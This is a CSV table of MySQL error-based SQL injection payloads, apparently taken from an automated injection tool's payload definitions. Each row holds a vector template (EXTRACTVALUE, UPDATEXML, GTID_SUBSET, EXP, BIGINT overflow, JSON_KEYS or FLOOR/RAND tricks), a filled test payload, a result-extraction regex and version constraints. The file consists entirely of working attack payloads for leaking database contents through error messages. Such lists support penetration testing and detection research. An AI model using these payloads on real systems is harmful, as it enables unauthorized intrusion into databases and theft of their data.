title,stype,level,risk,clause,where,vector,request/payload,response/grep,details/dbms/0,details/dbms_version,request/comment,details/dbms/1,tokens
"MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",2,1,1,"1,2,3,8,9",1,"AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))","AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,,"['AND', 'EXTRACTVALUE', '(', '[RANDNUM]', ',', 'CONCAT', '(', ',', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ')']"
"MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",2,1,3,"1,2,3,8,9",1,"OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))","OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,,"['OR', 'EXTRACTVALUE', '(', '[RANDNUM]', ',', 'CONCAT', '(', ',', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ')']"
"MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",2,2,1,"1,2,3,8,9",1,"AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])","AND GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.6,,,"['AND', 'GTID_SUBSET', '(', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ',', '[RANDNUM]', ')']"
MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET),2,2,3,"1,8,9",1,"OR GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])","OR GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.6,,,"['OR', 'GTID_SUBSET', '(', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ',', '[RANDNUM]', ')']"
"MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)",2,4,1,"1,2,3,8,9",1,"AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))","AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.5,,,"['AND', '(', 'SELECT', '2', '*', '(', 'IF', '(', '(', 'SELECT', '*', 'FROM', '(', 'SELECT', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'x', ')', ')', 's', ')', ',', '8446744073709551610', ',', '8446744073709551610', ')', ')', ')']"
MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED),2,4,3,"1,8,9",1,"OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))","OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.5,,,"['OR', '(', 'SELECT', '2', '*', '(', 'IF', '(', '(', 'SELECT', '*', 'FROM', '(', 'SELECT', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'x', ')', ')', 's', ')', ',', '8446744073709551610', ',', '8446744073709551610', ')', ')', ')']"
"MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)",2,4,1,"1,2,3,8,9",1,"AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))","AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.5,,,"['AND', 'EXP', '(', '(', 'SELECT', '*', 'FROM', '(', 'SELECT', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'x', ')', ')', 'x', ')', ')']"
MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP),2,4,3,"1,8,9",1,"OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))","OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.5,,,"['OR', 'EXP', '(', '(', 'SELECT', '*', 'FROM', '(', 'SELECT', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'x', ')', ')', 'x', ')', ')']"
"MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)",2,5,1,"1,2,3,8,9",1,"AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))","AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.7.8,,,"['AND', 'JSON_KEYS', '(', '(', 'SELECT', 'CONVERT', '(', '(', 'SELECT', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ')', 'USING', 'utf8', ')', ')', ')']"
MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS),2,5,3,"1,8,9",1,"OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))","OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.7.8,,,"['OR', 'JSON_KEYS', '(', '(', 'SELECT', 'CONVERT', '(', '(', 'SELECT', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ')', 'USING', 'utf8', ')', ')', ')']"
"MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",2,4,1,"1,2,3,8,9",1,"AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)","AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.0,,,"['AND', '(', 'SELECT', '[RANDNUM]', 'FROM', '(', 'SELECT', 'COUNT', '(', '*', ')', ',', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'FLOOR', '(', 'RAND', '(', '0', ')', '*', '2', ')', ')', 'x', 'FROM', 'INFORMATION_SCHEMA.PLUGINS', 'GROUP', 'BY', 'x', ')', 'a', ')']"
"MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",2,4,3,"1,2,3,8,9",1,"OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)","OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.0,,,"['OR', '(', 'SELECT', '[RANDNUM]', 'FROM', '(', 'SELECT', 'COUNT', '(', '*', ')', ',', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'FLOOR', '(', 'RAND', '(', '0', ')', '*', '2', ')', ')', 'x', 'FROM', 'INFORMATION_SCHEMA.PLUGINS', 'GROUP', 'BY', 'x', ')', 'a', ')']"
"MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",2,5,1,7,1,"(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)","(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.0,,,"['(', 'SELECT', '[RANDNUM]', 'FROM', '(', 'SELECT', 'COUNT', '(', '*', ')', ',', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'FLOOR', '(', 'RAND', '(', '0', ')', '*', '2', ')', ')', 'x', 'FROM', 'INFORMATION_SCHEMA.PLUGINS', 'GROUP', 'BY', 'x', ')', 'a', ')']"
"MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",2,3,1,"1,2,3,8,9",1,"AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])","AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,,"['AND', 'UPDATEXML', '(', '[RANDNUM]', ',', 'CONCAT', '(', ',', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ',', '[RANDNUM1]', ')']"
"MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",2,3,3,"1,2,3,8,9",1,"OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])","OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,,"['OR', 'UPDATEXML', '(', '[RANDNUM]', ',', 'CONCAT', '(', ',', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ',', '[RANDNUM1]', ')']"
"MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",2,5,1,"1,2,3,8,9",1,"AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)","AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 4.1,,,"['AND', 'ROW', '(', '[RANDNUM]', ',', '[RANDNUM1]', ')', '(', 'SELECT', 'COUNT', '(', '*', ')', ',', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'FLOOR', '(', 'RAND', '(', '0', ')', '*', '2', ')', ')', 'x', 'FROM', '(', 'SELECT', '[RANDNUM2]', 'UNION', 'SELECT', '[RANDNUM3]', 'UNION', 'SELECT', '[RANDNUM4]', 'UNION', 'SELECT', '[RANDNUM5]', ')', 'a', 'GROUP', 'BY', 'x', ')']"
MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR),2,5,3,"1,8,9",1,"OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)","OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 4.1,,,"['OR', 'ROW', '(', '[RANDNUM]', ',', '[RANDNUM1]', ')', '(', 'SELECT', 'COUNT', '(', '*', ')', ',', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'FLOOR', '(', 'RAND', '(', '0', ')', '*', '2', ')', ')', 'x', 'FROM', '(', 'SELECT', '[RANDNUM2]', 'UNION', 'SELECT', '[RANDNUM3]', 'UNION', 'SELECT', '[RANDNUM4]', 'UNION', 'SELECT', '[RANDNUM5]', ')', 'a', 'GROUP', 'BY', 'x', ')']"
